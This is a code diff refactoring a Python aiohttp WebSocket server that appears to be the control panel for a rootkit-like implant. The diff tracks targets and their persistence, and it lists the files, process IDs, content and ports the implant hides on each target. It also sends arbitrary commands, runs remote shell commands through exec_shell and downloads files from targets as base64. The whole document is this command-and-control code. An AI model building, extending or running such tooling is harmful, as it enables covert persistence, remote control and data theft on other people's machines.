@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import asyncio
 import base64
+from collections import deque
 import json
 import mimetypes
 import socket
@@ -21,7 +22,7 @@ HTTP_PORT = 8080
 
 _manager: TargetManager | None = None
 _ws_clients: set[web.WebSocketResponse] = set()
-_event_log: list[dict] = []
+_event_log: deque[dict] = deque(maxlen=50)
 _loop: asyncio.AbstractEventLoop | None = None
 _static_root: Path | None = None
 
@@ -50,8 +51,8 @@ def _parse_entry(reply: str):
     return parts[2] if reply.startswith("ENTRY ") and len(parts) > 2 else None
 
 
-def _target_to_dict(t: Target) -> dict:
-    """Serialize a Target to JSON-safe dict."""
+def _target_summary(t: Target) -> dict:
+    """Lightweight target dict with counts only (no LIST round-trips)."""
     status = {}
     if t.online:
         try:
@@ -63,9 +64,6 @@ def _target_to_dict(t: Target) -> dict:
                         status[k] = v
         except Exception:
             pass
-
-    hidden = {cat: _enum_indexed(t, f"LIST {cat.upper()}", "LIST", _parse_entry)
-              for cat in ("file", "pid", "content", "port")} if t.online else {}
 
     peer_addr = ""
     if t.online:
@@ -88,17 +86,26 @@ def _target_to_dict(t: Target) -> dict:
         "persisted": status.get("persisted", "?") == "yes",
         "counts": {k: int(status.get(k, 0))
                    for k in ("files", "pids", "content", "ports")},
-        "hidden": hidden,
     }
 
 
+def _target_detail(t: Target) -> dict:
+    """Full target dict including hidden item lists (on-demand only)."""
+    d = _target_summary(t)
+    d["hidden"] = {
+        cat: _enum_indexed(t, f"LIST {cat.upper()}", "LIST", _parse_entry)
+        for cat in ("file", "pid", "content", "port")
+    } if t.online else {}
+    return d
+
+
 def _snapshot() -> dict:
-    """Current state of all targets."""
+    """Current state of all targets (counts only, no LIST fetches)."""
     targets = _manager.list_all() if _manager else []
     return {
         "type": "state",
-        "targets": [_target_to_dict(t) for t in targets],
-        "events": _event_log[-50:],
+        "targets": [_target_summary(t) for t in targets],
+        "events": list(_event_log),
     }
 
 
@@ -134,7 +141,7 @@ async def _watch_target(ws: web.WebSocketResponse, target_id: str,
         if not target:
             continue
         try:
-            data = await loop.run_in_executor(None, _target_to_dict, target)
+            data = await loop.run_in_executor(None, _target_detail, target)
             payload = json.dumps({"type": "target_update", "target": data})
             if payload != prev:
                 await ws.send_str(payload)
@@ -143,12 +150,153 @@ async def _watch_target(ws: web.WebSocketResponse, target_id: str,
             return
 
 
+# -- WS message handlers --
+
+async def _ws_handle_watch(ws, data, loop, state):
+    tid = data.get("target")
+    if state["watch_cancel"]:
+        state["watch_cancel"].set()
+    if state["watch_task"]:
+        state["watch_task"].cancel()
+    if tid:
+        state["watch_cancel"] = asyncio.Event()
+        state["watch_task"] = asyncio.ensure_future(
+            _watch_target(ws, tid, state["watch_cancel"], loop))
+    else:
+        state["watch_cancel"] = None
+        state["watch_task"] = None
+
+
+async def _ws_handle_refresh(ws, data, loop, state):
+    snap = await loop.run_in_executor(None, _snapshot)
+    await ws.send_str(json.dumps(snap))
+
+
+async def _ws_handle_rename(ws, data, loop, state):
+    target_id = data.get("target")
+    new_label = data.get("label", "").strip()
+    if target_id and new_label and _manager:
+        target = _manager.get(target_id)
+        if target:
+            target.label = new_label
+            snap = await loop.run_in_executor(None, _snapshot)
+            _broadcast(json.dumps(snap))
+
+
+async def _ws_handle_command(ws, data, loop, state):
+    target_id = data.get("target")
+    command = data.get("command", "").strip()
+    if not target_id or not command:
+        return
+    target = _manager.get(target_id) if _manager else None
+    if not target or not target.online:
+        await ws.send_str(json.dumps({
+            "type": "result", "target": target_id,
+            "command": command, "ok": False, "reply": "target offline",
+        }))
+        return
+    try:
+        reply = await loop.run_in_executor(None, target.exchange, command)
+        await ws.send_str(json.dumps({
+            "type": "result", "target": target_id,
+            "command": command, "ok": True, "reply": reply,
+        }))
+        add_event(f"{target.id}: {command}", "cmd")
+    except Exception as e:
+        await ws.send_str(json.dumps({
+            "type": "result", "target": target_id,
+            "command": command, "ok": False, "reply": str(e),
+        }))
+
+
+async def _ws_handle_download(ws, data, loop, state):
+    target_id = data.get("target")
+    remote_path = data.get("path", "").strip()
+    dl_id = data.get("_dlId")
+    if not target_id or not remote_path:
+        return
+    target = _manager.get(target_id) if _manager else None
+    if not target or not target.online:
+        await ws.send_str(json.dumps({
+            "type": "download_result", "target": target_id,
+            "_dlId": dl_id, "path": remote_path,
+            "ok": False, "error": "target offline",
+        }))
+        return
+
+    async def _do_download():
+        def _progress(received: int, total: int) -> None:
+            asyncio.run_coroutine_threadsafe(
+                ws.send_str(json.dumps({
+                    "type": "download_progress", "_dlId": dl_id,
+                    "received": received, "total": total,
+                })),
+                loop,
+            )
+        try:
+            file_bytes, total = await loop.run_in_executor(
+                None, target.download_file, remote_path, _progress,
+            )
+            await ws.send_str(json.dumps({
+                "type": "download_result", "target": target_id,
+                "_dlId": dl_id, "path": remote_path, "ok": True,
+                "size": total,
+                "data": base64.b64encode(file_bytes).decode("ascii"),
+            }))
+            add_event(f"{target_id}: download {remote_path} ({len(file_bytes)}B)", "cmd")
+        except Exception as e:
+            await ws.send_str(json.dumps({
+                "type": "download_result", "target": target_id,
+                "_dlId": dl_id, "path": remote_path,
+                "ok": False, "error": str(e),
+            }))
+
+    asyncio.ensure_future(_do_download())
+
+
+async def _ws_handle_exec(ws, data, loop, state):
+    target_id = data.get("target")
+    shell_cmd = data.get("command", "").strip()
+    exec_id = data.get("_execId")
+    if not target_id or not shell_cmd:
+        return
+    target = _manager.get(target_id) if _manager else None
+    if not target or not target.online:
+        await ws.send_str(json.dumps({
+            "type": "exec_result", "target": target_id,
+            "_execId": exec_id, "ok": False, "output": "target offline",
+        }))
+        return
+    try:
+        output = await loop.run_in_executor(
+            None, target.exec_shell, shell_cmd,
+        )
+        await ws.send_str(json.dumps({
+            "type": "exec_result", "target": target_id,
+            "_execId": exec_id, "ok": True, "output": output,
+        }))
+    except Exception as e:
+        await ws.send_str(json.dumps({
+            "type": "exec_result", "target": target_id,
+            "_execId": exec_id, "ok": False, "output": str(e),
+        }))
+
+
+_WS_HANDLERS = {
+    "watch": _ws_handle_watch,
+    "refresh": _ws_handle_refresh,
+    "rename": _ws_handle_rename,
+    "command": _ws_handle_command,
+    "download": _ws_handle_download,
+    "exec": _ws_handle_exec,
+}
+
+
 async def _ws_endpoint(request: web.Request) -> web.WebSocketResponse:
     ws = web.WebSocketResponse()
     await ws.prepare(request)
     _ws_clients.add(ws)
-    watch_cancel: asyncio.Event | None = None
-    watch_task: asyncio.Task | None = None
+    state = {"watch_cancel": None, "watch_task": None}
     try:
         loop = asyncio.get_event_loop()
         snap = await loop.run_in_executor(None, _snapshot)
@@ -160,157 +308,14 @@ async def _ws_endpoint(request: web.Request) -> web.WebSocketResponse:
                 data = json.loads(msg.data)
             except json.JSONDecodeError:
                 continue
-
-            cmd_type = data.get("type", "")
-
-            if cmd_type == "watch":
-                tid = data.get("target")
-                if watch_cancel:
-                    watch_cancel.set()
-                if watch_task:
-                    watch_task.cancel()
-                if tid:
-                    watch_cancel = asyncio.Event()
-                    watch_task = asyncio.ensure_future(
-                        _watch_target(ws, tid, watch_cancel, loop))
-                else:
-                    watch_cancel = None
-                    watch_task = None
-
-            elif cmd_type == "refresh":
-                snap = await loop.run_in_executor(None, _snapshot)
-                await ws.send_str(json.dumps(snap))
-
-            elif cmd_type == "rename":
-                target_id = data.get("target")
-                new_label = data.get("label", "").strip()
-                if target_id and new_label and _manager:
-                    target = _manager.get(target_id)
-                    if target:
-                        target.label = new_label
-                        snap = await loop.run_in_executor(None, _snapshot)
-                        _broadcast(json.dumps(snap))
-
-            elif cmd_type == "command":
-                target_id = data.get("target")
-                command = data.get("command", "").strip()
-                if not target_id or not command:
-                    continue
-                target = _manager.get(target_id) if _manager else None
-                if not target or not target.online:
-                    await ws.send_str(json.dumps({
-                        "type": "result",
-                        "target": target_id,
-                        "command": command,
-                        "ok": False,
-                        "reply": "target offline",
-                    }))
-                    continue
-                try:
-                    reply = await loop.run_in_executor(
-                        None, target.exchange, command,
-                    )
-                    await ws.send_str(json.dumps({
-                        "type": "result",
-                        "target": target_id,
-                        "command": command,
-                        "ok": True,
-                        "reply": reply,
-                    }))
-                    add_event(f"{target.id}: {command}", "cmd")
-                except Exception as e:
-                    await ws.send_str(json.dumps({
-                        "type": "result",
-                        "target": target_id,
-                        "command": command,
-                        "ok": False,
-                        "reply": str(e),
-                    }))
-
-            elif cmd_type == "download":
-                target_id = data.get("target")
-                remote_path = data.get("path", "").strip()
-                dl_id = data.get("_dlId")
-                if not target_id or not remote_path:
-                    continue
-                target = _manager.get(target_id) if _manager else None
-                if not target or not target.online:
-                    await ws.send_str(json.dumps({
-                        "type": "download_result", "target": target_id,
-                        "_dlId": dl_id,
-                        "path": remote_path,
-                        "ok": False, "error": "target offline",
-                    }))
-                    continue
-
-                async def _do_download(t, path, did, tid):
-                    def _progress(received: int, total: int) -> None:
-                        asyncio.run_coroutine_threadsafe(
-                            ws.send_str(json.dumps({
-                                "type": "download_progress",
-                                "_dlId": did,
-                                "received": received,
-                                "total": total,
-                            })),
-                            loop,
-                        )
-                    try:
-                        file_bytes, total = await loop.run_in_executor(
-                            None, t.download_file, path, _progress,
-                        )
-                        await ws.send_str(json.dumps({
-                            "type": "download_result", "target": tid,
-                            "_dlId": did,
-                            "path": path, "ok": True,
-                            "size": total,
-                            "data": base64.b64encode(file_bytes).decode("ascii"),
-                        }))
-                        add_event(f"{tid}: download {path} ({len(file_bytes)}B)", "cmd")
-                    except Exception as e:
-                        await ws.send_str(json.dumps({
-                            "type": "download_result", "target": tid,
-                            "_dlId": did,
-                            "path": path,
-                            "ok": False, "error": str(e),
-                        }))
-
-                asyncio.ensure_future(_do_download(target, remote_path, dl_id, target_id))
-
-            elif cmd_type == "exec":
-                target_id = data.get("target")
-                shell_cmd = data.get("command", "").strip()
-                exec_id = data.get("_execId")
-                if not target_id or not shell_cmd:
-                    continue
-                target = _manager.get(target_id) if _manager else None
-                if not target or not target.online:
-                    await ws.send_str(json.dumps({
-                        "type": "exec_result", "target": target_id,
-                        "_execId": exec_id,
-                        "ok": False, "output": "target offline",
-                    }))
-                    continue
-                try:
-                    output = await loop.run_in_executor(
-                        None, target.exec_shell, shell_cmd,
-                    )
-                    await ws.send_str(json.dumps({
-                        "type": "exec_result", "target": target_id,
-                        "_execId": exec_id,
-                        "ok": True, "output": output,
-                    }))
-                except Exception as e:
-                    await ws.send_str(json.dumps({
-                        "type": "exec_result", "target": target_id,
-                        "_execId": exec_id,
-                        "ok": False, "output": str(e),
-                    }))
-
+            handler = _WS_HANDLERS.get(data.get("type", ""))
+            if handler:
+                await handler(ws, data, loop, state)
     finally:
-        if watch_cancel:
-            watch_cancel.set()
-        if watch_task:
-            watch_task.cancel()
+        if state["watch_cancel"]:
+            state["watch_cancel"].set()
+        if state["watch_task"]:
+            state["watch_task"].cancel()
         _ws_clients.discard(ws)
     return ws
 
